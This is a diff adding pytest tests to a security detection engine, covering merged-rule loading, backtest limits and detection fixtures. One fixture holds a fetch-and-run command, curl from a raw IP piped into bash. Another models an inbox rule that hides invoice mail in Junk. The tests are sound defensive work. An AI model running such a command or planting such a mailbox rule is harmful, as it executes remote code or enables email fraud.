@@ -6,6 +6,7 @@ on Databricks or Snowflake fails here rather than in a customer's account.
 
 from __future__ import annotations
 
+import json
 from datetime import UTC, datetime, timedelta
 from typing import Any
 
@@ -39,6 +40,9 @@ def test_rule_fires_on_its_positive_fixture(rule, store, config, clean, now):
     assert findings, f"{rule.id} did not fire on its positive fixture"
     assert all(f.event_uids for f in findings), "a finding without cited events is not allowed"
     assert findings[0].severity == rule.severity
+    # Every shipped rule names an entity; '-' means its fields never mapped, and
+    # every principal would share one finding per bucket.
+    assert all(f.entity_key != "-" for f in findings), f"{rule.id}: entity never resolved"
 
 
 @pytest.mark.parametrize("rule", RULES, ids=lambda r: r.id)
@@ -498,6 +502,74 @@ def test_an_ad_hoc_run_reads_at_most_its_limit(store, config, clean, now, monkey
     batch.load(store, _trail(tenant, times, start, "a", op="DeleteTrail"))
     findings = run_rule(store, tenant, MATCH, start, start + timedelta(minutes=15))
     assert [f.event_count for f in findings] == [engine.ADHOC_LIMIT]
+
+
+def test_the_merge_gate_backtest_reads_past_the_ad_hoc_limit(store, config, clean, now):
+    """A rule whose first 200 rows fall in 20 buckets still reaches the ceiling (AGT-13),
+    and the gate stops reading once it has."""
+    from shoc.agents import detection_engineer as engineer
+
+    tenant, start = config.tenant_id, _boundary(now)
+    times = [start + timedelta(minutes=15 * b, seconds=s) for b in range(30) for s in range(10)]
+    batch.load(store, _trail(tenant, times, start, "a", op="DeleteTrail"))
+    ceiling = engineer.volume_ceiling(7)
+    assert len(engineer.backtest(store, tenant, MATCH, 7)) == 20 < ceiling
+    assert len(engineer.backtest(store, tenant, MATCH, 7, whole=True)) == ceiling < 30
+
+
+# -- merged rules over shipped ones (D48, D55) --------------------------------
+def test_a_merged_rule_that_no_longer_loads_or_takes_a_shipped_id_is_left_out(
+    conn, store, config, clean, now
+):
+    """One bad row must not stop every rule, and a later shipped rule wins its id."""
+    from shoc.agents import detection_engineer as engineer
+    from shoc.agents import ops
+
+    tenant, shipped = config.tenant_id, RULES[0]
+    copy = {
+        "id": shipped.id,
+        "title": "A merged copy",
+        "logsource": {"product": "aws"},
+        "detection": {"selection": {"api.operation": "DeleteTrail"}, "condition": "selection"},
+    }
+    # No title: from_dict raises KeyError, as after a release that renames a key.
+    broken = {"id": "test_broken", **{k: v for k, v in copy.items() if k not in ("id", "title")}}
+    for rule_id, body in (("test_broken", broken), (shipped.id, copy)):
+        execute(
+            conn,
+            """INSERT INTO shoc.merged_rules (tenant_id, rule_id, body, playbook_id, merged_by)
+               VALUES (%s, %s, %s, '', 'agent:test')""",
+            (tenant, rule_id, json.dumps(body)),
+        )
+    skipped: dict[str, str] = {}
+    loaded = {r.id: r for r in ruleset.load(config, conn, tenant, skipped)}
+    assert set(loaded) == {r.id for r in RULES}
+    assert loaded[shipped.id].title == shipped.title, "the shipped rule wins its id"
+    assert set(skipped) == {"test_broken", shipped.id}
+    assert "no longer loads" in skipped["test_broken"]
+    assert skipped[shipped.id] == ruleset.SHADOWED
+
+    # detect.run hands run_all its rules; the cycle still names what it left out,
+    # and the shipped rule it did not run is not marked failing for it.
+    for _ in range(2):
+        run_all(conn, store, tenant, [MATCH], now=now)
+    state = _state(conn, tenant, "test_broken")
+    assert state and "no longer loads" in state["last_error"]
+    assert _state(conn, tenant, shipped.id) is None
+    for rule_id in ("test_broken", shipped.id):
+        notices = fetch_all(
+            conn,
+            "SELECT body FROM shoc.notices WHERE tenant_id = %s AND group_key = %s",
+            (tenant, rule_id),
+        )
+        assert len(notices) == 1, "the Manager hears of each once, for the digest"
+    failing = {a.subject for a in ops.alerts(conn, tenant) if a.kind == "rule.failing"}
+    assert failing == {"test_broken"}
+
+    # Reverting the row, the only fix, takes its alert with it.
+    engineer.revert(conn, tenant, "test_broken", "no longer loads", config=config)
+    assert _state(conn, tenant, "test_broken") is None
+    assert not [a for a in ops.alerts(conn, tenant) if a.kind == "rule.failing"]
 
 
 # -- RFC 0023: the format additions, run end to end -------------------------
@@ -1121,3 +1193,78 @@ def test_contains_re_and_exists_read_a_json_list_or_object(store, config, clean,
         )
         == []
     )
+
+
+def test_a_download_from_a_raw_address_is_caught_in_capitals(store, config, clean, now):
+    """`re` is case-sensitive, so the rule spells the scheme in either case."""
+    rule = next(r for r in RULES if r.id == "endpoint_unix_shell_download_and_run")
+    record = {
+        "event_simpleName": "ProcessRollup2",
+        "aid": "0123456789abcdef0123456789abcd31",
+        "cid": "fedcba9876543210fedcba9876543210",
+        "event_platform": "Lin",
+        "ComputerName": "web-04",
+        "ImageFileName": "/usr/bin/bash",
+        "CommandLine": "bash -c curl -s HTTP://203.0.113.80/i.sh | bash",
+        "ParentBaseFileName": "bash",
+        "RawProcessId": "7101",
+        "UserName": "deploy",
+    }
+    batch.load(store, fixture_rows([record], "crowdstrike_fdr", config.tenant_id, now))
+    found = run_rule(
+        store, config.tenant_id, rule, now - timedelta(hours=1), now + timedelta(minutes=1)
+    )
+    assert found, "an upper-case scheme hid a download from a raw address"
+
+
+@pytest.mark.parametrize(
+    "folder",
+    [
+        "Junk Email",
+        "Junk E-mail",
+        "Courrier indésirable",
+        "Junk-E-Mail",
+        "Correo no deseado",
+        "Posta indesiderata",
+        "Ongewenste e-mail",
+        "Lixo Eletrônico",
+    ],
+)
+def test_an_inbox_rule_that_hides_mail_in_junk_fires_in_every_language(
+    folder, store, config, clean, now
+):
+    """Nobody reads Junk Email, so a BEC rule files the vendor's reply there (DET-2)."""
+    rule = next(r for r in RULES if r.id == "m365_inbox_rule_created")
+    record = {
+        "Id": "m365-New-InboxRule-junk",
+        "Operation": "New-InboxRule",
+        "OrganizationId": "org-1",
+        "RecordType": 1,
+        "ResultStatus": "True",
+        "UserId": "jane@example.com",
+        "Workload": "Exchange",
+        "ClientIP": "203.0.113.45",
+        "Parameters": [
+            {"Name": "Name", "Value": "Invoices"},
+            {"Name": "SubjectOrBodyContainsWords", "Value": "invoice"},
+            {"Name": "MoveToFolder", "Value": f"jane@example.com:\\{folder}"},
+        ],
+    }
+    batch.load(store, fixture_rows([record], "m365", config.tenant_id, now))
+    found = run_rule(
+        store, config.tenant_id, rule, now - timedelta(hours=1), now + timedelta(minutes=1)
+    )
+    assert found, f"a rule moving mail to {folder} raised nothing"
+
+
+@pytest.mark.parametrize("uid", ["gw-2sv-off-second", "gw-2sv-any-method-second"])
+def test_two_step_verification_turned_off_later_in_a_save_fires(uid, store, config, clean, now):
+    """A save whose first event is another 2SV setting still turns 2SV off (ING-3)."""
+    rule = next(r for r in RULES if r.id == "google_two_step_verification_disabled")
+    record = next(r for r in load_fixture(rule.id, "positive") if r["id"]["uniqueQualifier"] == uid)
+    assert record["events"][0]["name"] == "CHANGE_TWO_STEP_VERIFICATION_ENROLLMENT_PERIOD_DURATION"
+    batch.load(store, fixture_rows([record], fixture_source(rule), config.tenant_id, now))
+    found = run_rule(
+        store, config.tenant_id, rule, now - timedelta(hours=1), now + timedelta(minutes=1)
+    )
+    assert found, f"{uid}: the event that turns 2SV off was not its save's first, and was missed"
